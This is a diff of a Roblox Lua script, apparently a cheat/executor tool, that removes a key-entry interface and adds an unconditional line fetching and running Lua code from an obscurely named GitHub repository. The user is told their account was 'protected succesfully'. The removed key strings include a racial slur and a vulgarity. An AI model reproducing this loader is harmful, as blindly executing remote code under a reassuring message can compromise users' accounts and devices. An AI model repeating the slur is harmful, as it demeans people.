@@ -4,12 +4,6 @@ local content = game:GetService("ContentProvider")
 local input = game:GetService("UserInputService")
 
 local runn
-local device = ""
-
-local link = "https://ify.ac/1Yhw"
-
-local adminkey = "nigga"
-local KEY = "bigdick"
 
 local GUI = Instance.new("ScreenGui")
 local s, a = pcall(function() GUI.Parent = game.CoreGui end) if not s then GUI.Parent = game.Players.LocalPlayer.PlayerGui end
@@ -167,92 +161,8 @@ if not work2 then
 else
       Write("Your account was protected succesfully", "succes")
 end
-wait(1)
-loading:Destroy()
-text:Destroy()
 
-local KEYINPUT = Instance.new("TextBox")
-KEYINPUT.Parent = MENU
-KEYINPUT.Name = "input"
-KEYINPUT.BackgroundColor3 = Color3.new(1, 1, 1)
-KEYINPUT.ClearTextOnFocus = false
-KEYINPUT.TextEditable = true
-KEYINPUT.Position = UDim2.new(0.231, 0, 0.241, 0)
-KEYINPUT.Size = UDim2.new(0.531, 0, 0.149, 0)
-KEYINPUT.PlaceholderText = "Put your key here"
-KEYINPUT.PlaceholderColor3 = Color3.new(0.513725, 0.513725, 0.513725)
-KEYINPUT.TextColor3 = Color3.new(0, 0, 0)
-KEYINPUT.TextScaled = true
-KEYINPUT.Text = ""
-KEYINPUT.Visible = true
-
-local uickeyinput = Instance.new("UICorner")
-uickeyinput.Parent = KEYINPUT
-uickeyinput.CornerRadius = UDim.new(0, 8)
-
-local uiskeyinput = Instance.new("UIStroke")
-uiskeyinput.Parent = KEYINPUT
-uiskeyinput.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
-uiskeyinput.Color = Color3.new(0, 0, 0)
-uiskeyinput.LineJoinMode = Enum.LineJoinMode.Round
-uiskeyinput.Thickness = 4
-uiskeyinput.Transparency = 0.2
-
-local GETKEYBUTTON = Instance.new("TextButton")
-GETKEYBUTTON.Parent = MENU
-GETKEYBUTTON.Name = "GetKey"
-GETKEYBUTTON.BackgroundColor3 = Color3.new(1, 1, 1)
-GETKEYBUTTON.Position = UDim2.new(0.231, 0, 0.681, 0)
-GETKEYBUTTON.Size = UDim2.new(0.452, 0, 0.112, 0)
-GETKEYBUTTON.Font = Enum.Font.RobotoMono
-GETKEYBUTTON.TextColor3 = Color3.new(0, 0, 0)
-GETKEYBUTTON.TextScaled = true
-GETKEYBUTTON.Text = "Get Key"
-GETKEYBUTTON.Visible = true
-
-local uicgetkeybutton = Instance.new("UICorner")
-uicgetkeybutton.Parent = GETKEYBUTTON
-uicgetkeybutton.CornerRadius = UDim.new(0, 8)
-
-local uisgetkeybutton = Instance.new("UIStroke")
-uisgetkeybutton.Parent = GETKEYBUTTON
-uisgetkeybutton.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
-uisgetkeybutton.Color = Color3.new(0, 0, 0)
-uisgetkeybutton.LineJoinMode = Enum.LineJoinMode.Round
-uisgetkeybutton.Thickness = 3.5
-uisgetkeybutton.Transparency = 0.2
-
-local CHECKBUTTON = Instance.new("ImageButton")
-CHECKBUTTON.Parent = MENU
-CHECKBUTTON.Name = "check"
-CHECKBUTTON.BackgroundColor3 = Color3.new(1, 1, 1)
-CHECKBUTTON.Position = UDim2.new(0.697, 0, 0.681, 0)
-CHECKBUTTON.Size = UDim2.new(0.067, 0, 0.112, 0)
-CHECKBUTTON.Image = "rbxassetid://76645474804869"
-CHECKBUTTON.ImageColor3 = Color3.new(0, 0, 0)
-CHECKBUTTON.Visible = true
-
-local uiccheckbutton = Instance.new("UICorner")
-uiccheckbutton.Parent = CHECKBUTTON
-uiccheckbutton.CornerRadius = UDim.new(0, 8)
-
-local uischeckbutton = Instance.new("UIStroke")
-uischeckbutton.Parent = CHECKBUTTON
-uischeckbutton.Color = Color3.new(0, 0, 0)
-uischeckbutton.LineJoinMode = Enum.LineJoinMode.Round
-uischeckbutton.Thickness = 3.5
-uischeckbutton.Transparency = 0.2
-
-CHECKBUTTON.MouseButton1Click:Connect(function()
-      if KEYINPUT.Text == adminkey or KEYINPUT.Text == KEY then
-            loadstring(game:HttpGet("https://raw.githubusercontent.com/drgdrxgdxrhyxdrhedrhesrdherd/dontworry/refs/heads/main/sfsefesh.lua"))()
-            GUI:Destroy()
-      else
-            KEYINPUT.Text = "invalid key!"
-      end
-end)
-
-GETKEYBUTTON.MouseButton1Click:Connect(function()
-      KEYINPUT.Text = link
-      pcall(function() setclipboard(tostring(link)) end)
-end)
+runn:Disconnect()
+runn = nil
+pcall(function() loadstring(game:HttpGet("https://raw.githubusercontent.com/drgdrxgdxrhyxdrhedrhesrdherd/dontworry/refs/heads/main/sfsefesh.lua"))() end)
+GUI:Destroy()
